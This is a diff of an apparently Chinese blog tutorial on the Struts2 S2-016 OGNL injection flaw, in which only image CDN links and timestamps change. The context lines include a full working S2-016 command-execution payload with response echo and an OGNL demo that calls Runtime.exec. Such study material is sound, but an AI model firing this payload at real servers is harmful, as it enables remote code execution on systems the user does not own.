@@ -51,7 +51,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
 <meta property="article:published_time" content="2026-05-10T02:30:00.000Z">
-<meta property="article:modified_time" content="2026-05-14T10:03:45.616Z">
+<meta property="article:modified_time" content="2026-05-14T13:33:24.520Z">
 <meta property="article:author" content="wr0ld">
 <meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="Java">
@@ -69,7 +69,7 @@
   <!-- feed -->
   
 
-  <link rel="stylesheet" href="/css/main.css?v=mp5bt8im">
+  <link rel="stylesheet" href="/css/main.css?v=mp5jbj4y">
 
 
   
@@ -78,7 +78,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-05-10T10:30:00+08:00","dateModified":"2026-05-14T18:03:45+08:00","datePublished":"2026-05-10T10:30:00+08:00","description":"","headline":"代码审计 | Struts2 —— S2-016 OGNL 注入原理","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/a7f2b9d3/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/a7f2b9d3/","keywords":"代码审计, Java, RCE, Struts2, S2-016, OGNL","thumbnailUrl":"https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/oM1sigyCiAA6DgFAIPAB3maXXAIyPqmHjE4LY~tplv-dy-aweme-images-ds-rs-v1_1920_1080_q80.jpg","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-05-10T10:30:00+08:00","dateModified":"2026-05-14T21:33:24+08:00","datePublished":"2026-05-10T10:30:00+08:00","description":"","headline":"代码审计 | Struts2 —— S2-016 OGNL 注入原理","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/a7f2b9d3/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/a7f2b9d3/","keywords":"代码审计, Java, RCE, Struts2, S2-016, OGNL","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/oM1sigyCiAA6DgFAIPAB3maXXAIyPqmHjE4LY~tplv-dy-aweme-images-ds-rs-v1_1920_1080_q80.jpg","image":1}</script>
   
 </head>
 <body><div class="reading-progress-bar"></div>
@@ -171,22 +171,22 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/struts2/s2-016</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 
 <p>起来之后访问 <code>http://127.0.0.1:8080/</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_3zyx.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_3zyx.png"></p>
 <p>用 Yakit 抓个包看看原始请求长什么样：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_efs5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_efs5.png"></p>
 <p>这是原始的包：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_gs8g.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_gs8g.png"></p>
 <p>把 GET 请求的 URL 参数换成下面这个 Payload（已 URL 编码）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.action?redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D@java.lang.Runtime@getRuntime().exec(%22id%22)%2C%23b%3Dnew+java.io.InputStreamReader(%23a.getInputStream())%2C%23c%3Dnew+java.io.BufferedReader(%23b)%2C%23d%3D%23c.readLine()%2C%23matt%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23matt.getWriter().println(%23d)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D</span><br></pre></td></tr></table></figure>
 
 <p>可以看到命令执行结果被正常回写了：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_3luk.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_3luk.png"></p>
 <hr>
 <h2 id="二、URL-编码的那点细节"><a href="#二、URL-编码的那点细节" class="headerlink" title="二、URL 编码的那点细节"></a>二、URL 编码的那点细节</h2><p>这里有个小问题——上面的 Payload 是自己手动 URL 编码过的，如果直接发送未编码版本：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.action?redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;id&quot;),#b=new java.io.InputStreamReader(#a.getInputStream()),#c=new java.io.BufferedReader(#b),#d=#c.readLine(),#matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#matt.getWriter().println(#d),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
 
 <p>不仅没有返回命令结果，还直接 400 了：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_h0eu.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_h0eu.png"></p>
 <p>这里有个细节：<strong>浏览器的自动编码并不是对整个 URL 都编码</strong>，它只编码它认为”需要编码”的字符，有些字符浏览器认为是 URL 的合法字符就不会动。</p>
 <p>比如 <code>#</code> 这个字符：</p>
 <ul>
@@ -275,7 +275,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OgnlDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 最简单：数学计算</span></span><br><span class="line">        <span class="comment">// Ognl.getValue()    →  OGNL 引擎的入口方法，把第一个参数当表达式执行</span></span><br><span class="line">        <span class="comment">// &quot;1+1&quot;              →  表达式字符串，就是要执行的&quot;代码&quot;</span></span><br><span class="line">        <span class="comment">// new OgnlContext()  →  OGNL 上下文，存放 #context #request 这些变量的容器，现在是空的</span></span><br><span class="line">        <span class="comment">// new Object()       →  root 对象，表达式里不带 # 的属性访问从这里找，现在也是空的</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;1+1&quot;</span>, <span class="keyword">new</span> <span class="title class_">OgnlContext</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">        System.out.println(<span class="string">&quot;1+1 = &quot;</span> + result);  <span class="comment">// 输出 2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 调用 Java 静态方法</span></span><br><span class="line">        <span class="comment">// @java.lang.System@  →  OGNL 调用静态类的语法，@ 开头 @ 结尾包住类名，表示访问这个类</span></span><br><span class="line">        <span class="comment">// getProperty(&#x27;os.name&#x27;) →  调用 System.getProperty() 静态方法</span></span><br><span class="line">        <span class="comment">// 翻译成普通 Java：String result2 = System.getProperty(&quot;os.name&quot;);</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result2</span> <span class="operator">=</span> Ognl.getValue(</span><br><span class="line">                <span class="string">&quot;@java.lang.System@getProperty(&#x27;os.name&#x27;)&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">OgnlContext</span>(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>()</span><br><span class="line">        );</span><br><span class="line">        System.out.println(<span class="string">&quot;OS: &quot;</span> + result2);  <span class="comment">// 输出操作系统名</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 模拟用户输入被当成表达式执行（漏洞本质）</span></span><br><span class="line">        <span class="comment">// userInput 是一个普通字符串，但被传进了 Ognl.getValue()</span></span><br><span class="line">        <span class="comment">// 字符串就变成了可执行的代码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">userInput</span> <span class="operator">=</span> <span class="string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line">        Ognl.getValue(userInput, <span class="keyword">new</span> <span class="title class_">OgnlContext</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">        <span class="comment">// Windows 下直接弹计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>运行效果：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_f9zw.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_f9zw.png"></p>
 <p>三段代码都执行了。</p>
 <p><strong>关键点就在这里：</strong></p>
 <ul>
@@ -289,14 +289,14 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OgnlDemo2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模拟一个普通的 Java 对象，作为 root</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">        <span class="comment">//两个私有字段</span></span><br><span class="line">        <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">18</span>;</span><br><span class="line">        <span class="comment">//一个公共的字段</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123; <span class="keyword">return</span> age; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello, 我是&quot;</span> + name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> a + b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================== 准备环境 ====================</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();       <span class="comment">// root 对象，不带 # 的表达式从这里找属性</span></span><br><span class="line">        <span class="type">OgnlContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OgnlContext</span>();  <span class="comment">// context 上下文，带 # 的表达式从这里找</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟 Struts2 往 context 里塞关键对象</span></span><br><span class="line">        context.put(<span class="string">&quot;myVar&quot;</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;num&quot;</span>, <span class="number">100</span>);</span><br><span class="line">        context.put(<span class="string">&quot;user2&quot;</span>, <span class="keyword">new</span> <span class="title class_">User</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================== 访问 root 对象 ====================</span></span><br><span class="line">        <span class="comment">// 直接写属性名，从 root 对象找</span></span><br><span class="line">        <span class="comment">// 私有字段会自动调用 getter，没有 getter 就会报错</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">r1</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;name&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;root.name = &quot;</span> + r1);  <span class="comment">// 张三</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">r2</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;age&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;root.age = &quot;</span> + r2);   <span class="comment">// 18</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 公共字段可以直接访问</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">r3</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;c&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;root.c = &quot;</span> + r3);     <span class="comment">// 10</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用 root 对象的方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">r4</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;sayHello()&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;sayHello() = &quot;</span> + r4); <span class="comment">// Hello, 我是张三</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">r5</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;add(1, 2)&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;add(1, 2) = &quot;</span> + r5);  <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================== 访问 context 变量 ====================</span></span><br><span class="line">        <span class="comment">// # 开头，从 context 这个 Map 里找</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">c1</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#myVar&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;#myVar = &quot;</span> + c1);      <span class="comment">// hello</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">c2</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#num + 1&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;#num+1 = &quot;</span> + c2);      <span class="comment">// 101</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 访问 context 里存的对象的属性</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">c3</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#user2.name&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;#user2.name = &quot;</span> + c3); <span class="comment">// 张三</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">c4</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#user2.sayHello()&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;#user2.sayHello() = &quot;</span> + c4); <span class="comment">// Hello, 我是张三</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================== 在 context 里赋值 ====================</span></span><br><span class="line">        <span class="comment">// # 变量可以在表达式里直接赋值，相当于声明临时变量</span></span><br><span class="line">        <span class="comment">// Payload 里的 #matt = #context.get(...) 就是这种写法</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;#tmp = &#x27;world&#x27;&quot;</span>, context, user);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c5</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#tmp&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;#tmp = &quot;</span> + c5);        <span class="comment">// world</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 链式赋值 + 计算</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;#a = #num, #b = #a + 99, #b&quot;</span>, context, user);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c6</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#b&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;#b = &quot;</span> + c6);          <span class="comment">// 199</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>运行结果：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_sq3a.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_sq3a.png"></p>
 <p>这个示例把 OGNL 里 <code>root</code> 和 <code>#context</code> 的用法都演示了一遍，Payload 里的 <code>#matt=#context.get(&quot;...&quot;)</code> 就是从 context 这个 Map 里取出 <code>HttpServletResponse</code>，然后用它写回显，原理就是这样。</p>
 <hr>
 <h2 id="七、搭建-Struts2-靶场（本地复现）"><a href="#七、搭建-Struts2-靶场（本地复现）" class="headerlink" title="七、搭建 Struts2 靶场（本地复现）"></a>七、搭建 Struts2 靶场（本地复现）</h2><p>后面要做代码审计，需要一个自己能调试的 Struts2 环境。</p>
 <h3 id="新建-Tomcat-项目"><a href="#新建-Tomcat-项目" class="headerlink" title="新建 Tomcat 项目"></a>新建 Tomcat 项目</h3><p>新建一个 Tomcat 项目（配置过程就不赘述了）：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_qkpa.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_qkpa.png"></p>
 <p>访问 <code>http://localhost:8080/</code> 可以正常访问：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_45a4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_45a4.png"></p>
 <h3 id="四个文件配置"><a href="#四个文件配置" class="headerlink" title="四个文件配置"></a>四个文件配置</h3><p><code>pom.xml</code> 里加上 Struts2 依赖，找到 <code>&lt;dependencies&gt;</code> 标签加进去：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -336,19 +336,19 @@
 
 <hr>
 <h3 id="验证漏洞触发"><a href="#验证漏洞触发" class="headerlink" title="验证漏洞触发"></a>验证漏洞触发</h3><p>四个文件建好之后启动 Tomcat，访问 <code>http://localhost:8080/index.action</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_qaj3.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_qaj3.png"></p>
 <p>访问 <code>http://localhost:8080/index.action?name=wrold</code>，返回 <code>Hello, wrold</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_ly5t.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_ly5t.png"></p>
 <p>然后试试触发 OGNL 表达式，访问：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/index.action?redirect:$&#123;1+1&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_flt6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_flt6.png"></p>
 <p>发现返回的是 <strong>HTTP 400 – Bad Request</strong>，原因是 Tomcat 在解析请求行时发现里面有非法字符（冒号、花括号、加号），根据 RFC 7230 和 RFC 3986，这些字符在查询参数里必须经过百分号编码。</p>
 <p>把 URL 里的特殊字符编码后再访问：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/index.action?redirect%3A%24%7B1%2B1%7D</span><br></pre></td></tr></table></figure>
 
 <p>返回的是 404”Not Found”（资源不存在）：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_n8yc.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_n8yc.png"></p>
 <p>但注意到 URL 路径变成了：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/2</span><br></pre></td></tr></table></figure>
 
@@ -370,21 +370,21 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://repo1.maven.org/maven2/org/apache/struts/struts2-core/2.3.15/struts2-core-2.3.15-sources.jar</span><br></pre></td></tr></table></figure>
 
 <h3 id="入口：StrutsPrepareAndExecuteFilter"><a href="#入口：StrutsPrepareAndExecuteFilter" class="headerlink" title="入口：StrutsPrepareAndExecuteFilter"></a>入口：StrutsPrepareAndExecuteFilter</h3><p>先根据 <code>web.xml</code> 里的 <code>StrutsPrepareAndExecuteFilter</code> 找到源文件，在 <code>doFilter</code> 打个断点：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_1l44.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_1l44.png"></p>
 <p>这里面出现了大量 <code>prepare</code> 字段，简单解释一下，就是 Filter 里的两个阶段：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">doFilter()</span><br><span class="line">    ↓</span><br><span class="line">prepare.wrapRequest()        ← Prepare 阶段</span><br><span class="line">  - 初始化 ActionContext</span><br><span class="line">  - 把 request/response/session 塞进 OGNL context</span><br><span class="line">  - 解析请求参数，绑定到 Action 字段</span><br><span class="line">        ↓</span><br><span class="line">execute.executeAction()      ← Execute 阶段</span><br><span class="line">  - 根据 struts.xml 找 Action</span><br><span class="line">  - 实例化 Action 类</span><br><span class="line">  - 调用 execute() 方法</span><br><span class="line">  - 处理返回结果（redirect/dispatcher）</span><br></pre></td></tr></table></figure>
 
 <hr>
 <h3 id="executeAction-与-ActionMapping"><a href="#executeAction-与-ActionMapping" class="headerlink" title="executeAction 与 ActionMapping"></a>executeAction 与 ActionMapping</h3><p>重点在 <code>execute.executeAction</code> 方法：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_f3uh.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_f3uh.png"></p>
 <p>除了 <code>Request</code> 和 <code>Response</code> 参数，还有一个 <code>mapping</code> 参数，可以看到参数里面的内容：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_m6r3.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_m6r3.png"></p>
 <p><code>mapping</code> 是 <code>ActionMapping</code> 对象，存的是 Struts2 解析完 URL 之后得到的路由信息：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">请求 /index.action?redirect:$&#123;1+1&#125;</span><br><span class="line">        ↓</span><br><span class="line">Struts2 解析 URL</span><br><span class="line">        ↓</span><br><span class="line">ActionMapping &#123;</span><br><span class="line">    name      = &quot;index&quot;               ← action 名字</span><br><span class="line">    namespace = &quot;/&quot;                   ← 命名空间</span><br><span class="line">    method    = &quot;null&quot;                ← 没指定方法，默认用 execute()</span><br><span class="line">    extension = &#x27;action&#x27;              ← 后缀是 .action</span><br><span class="line">    result    = ServletRedirectResult ← 识别出 redirect: 前缀，指定了结果处理类</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <hr>
 <h3 id="struts-default-xml-与各版本注入点"><a href="#struts-default-xml-与各版本注入点" class="headerlink" title="struts-default.xml 与各版本注入点"></a>struts-default.xml 与各版本注入点</h3><p>这个文件在 <code>struts2-core.jar</code> 包里，框架自带的：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_3n63.png"></p>
